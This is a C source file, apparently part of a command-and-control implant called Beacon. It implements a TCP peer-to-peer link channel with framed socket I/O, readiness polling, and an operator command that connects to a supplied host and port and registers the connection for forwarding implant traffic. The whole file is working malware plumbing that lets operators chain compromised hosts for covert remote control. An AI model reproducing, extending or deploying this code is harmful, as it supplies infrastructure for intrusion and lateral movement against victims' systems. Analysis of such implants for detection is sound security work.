#include "beacon.h"
#include "channel.h"
#include "commands.h"
#include "security.h"
#include "link.h"
#include "linkint.h"
#include "parse.h"

SOCKET wsconnect(char * targetip, int port);

/* poll our socket and see if it's ready to be read from */
static BOOL is_ready(SOCKET my_socket, int timeout) {
	int             status;
	DWORD           until = GetTickCount() + timeout;
	unsigned long   mode;
	char            buffer;
	BOOL            result = FALSE;

	/* make our socket non-blocking, so we can peek at what's happening */
	mode = 1;
	status = ioctlsocket(my_socket, FIONBIO, &mode);
	if (status == SOCKET_ERROR)
		return FALSE;

	/* peek data until our timeout */
	while (GetTickCount() < until) {
		status = recv(my_socket, &buffer, 1, MSG_PEEK);

		/* socket was gracefully closed */
		if (status == 0) {
			result = FALSE;
			break;
		}
		/* data is available, yay */
		else if (status > 0) {
			result = TRUE;
			break;
		}
		/* we would block, so try again [up to our timeout */
		else if (WSAGetLastError() == WSAEWOULDBLOCK) {
			Sleep(10);
		}
		/* some other socket error, bail */
		else {
			result = FALSE;
			break;
		}
	}

	/* make our socket blocking again */
	mode = 0;
	status = ioctlsocket(my_socket, FIONBIO, &mode);
	if (status == SOCKET_ERROR)
		return FALSE;

	return result;
}

/* send a frame via a socket. Need TRUE/FALSE return value. */
static int send_frame(SOCKET my_socket, char * buffer, int length) {
	int status;

	if (length == 0)
		return TRUE;

	status = send(my_socket, buffer, length, 0);
	if (status == SOCKET_ERROR)
		return FALSE;

	return TRUE;
}

/* receive a frame from a socket. Need >0/0/<0 return value. */
static int recv_frame(SOCKET my_socket, char * buffer, int size) {
	int total = 0, temp = 0;

	/* read in the result */
	while (total < size) {
		temp = recv(my_socket, buffer + total, size - total, 0);
		if (temp == SOCKET_ERROR)
			return -1;
		else if (temp == 0)
			break;

		total += temp;
	}

	if (total != size)
		return -1;

	return size;
}

/* 
 * Implement our SMB Beacon module.
 */
int link_channel_tcp_read(void * thisp, char * buffer, int max) {
	LCHANNEL * inst = (LCHANNEL *)thisp;
	char     * frame;
	int        flen, rlen, get;

	/* read our length into a pro-forma frame */
	frame = link_frame_header(SETTING_TCP_FRAME_HEADER, 0, &flen);
	rlen = recv_frame(inst->socket, frame, flen);
	if (rlen == -1 || rlen != flen)
		return -1;

	/* extract our length value... */
	memcpy(&get, frame + flen + -4, 4);

	/* sanity check our get value */
	if (get > max || get < 0)
		return -1;

	return recv_frame(inst->socket, buffer, get);
}

int link_channel_tcp_write(void * thisp, char * buffer, int length) {
	LCHANNEL * inst = (LCHANNEL *)thisp;
	char     * frame;
	int        flen;

	/* build and write our frame header */
	frame = link_frame_header(SETTING_TCP_FRAME_HEADER, length, &flen);
	if (!send_frame(inst->socket, frame, flen))
		return FALSE;

	/* write the entire package */
	return send_frame(inst->socket, buffer, length);
}

void link_channel_tcp_close(void * thisp) {
	LCHANNEL * inst = (LCHANNEL *)thisp;
	shutdown(inst->socket, SD_BOTH);
	closesocket(inst->socket);
}

int link_channel_tcp_ready(void * thisp, int timeout) {
	LCHANNEL * inst = (LCHANNEL *)thisp;
	return is_ready(inst->socket, timeout);
}

void link_channel_tcp_nop(void * thisp) {
	/* do nothing */
}

LCHANNEL lchannel_tcp(SOCKET socket) {
	LCHANNEL channel;

	/* contract of our TCP channe: use blocking I/O */
	u_long     mode = 0;
	ioctlsocket(socket, FIONBIO, &mode);

	/* OKie, setup the actual channel value */
	channel.socket = socket;
	channel.read   = link_channel_tcp_read;
	channel.write  = link_channel_tcp_write;
	channel.close  = link_channel_tcp_close;
	channel.flush  = link_channel_tcp_nop;
	channel.ready  = link_channel_tcp_ready;
	channel.wait   = link_channel_tcp_nop;
	return channel;
}

void command_tcp_connect(char * buffer, int length, void(*callback)(char * buffer, int length, int type)) {
	SOCKET   client = INVALID_SOCKET;
	datap    parser;
	char   * host;
	int      port;
	DWORD    stopat = GetTickCount() + 15000;

	/* extract our host and port */
	data_init(&parser, buffer, length);
	port = data_short(&parser);
	host = data_buffer(&parser);

	/* init our winsock socket */
	channel_winsock_init();

	/* connect! */
	while (GetTickCount() < stopat) {
		client = wsconnect(host, port);
		if (client == INVALID_SOCKET) {
			Sleep(1000);
		}
		else {
			break;
		}
	}

	/* if we failed above, please let the operator know */
	if (client == INVALID_SOCKET) {
		post_error_d(0x44, WSAGetLastError());
		return;
	}

	/* initialize our client (IF we were successful) */
	link_register(lchannel_tcp(client), CHANNEL_FORWARD_TCP(port), callback);
}
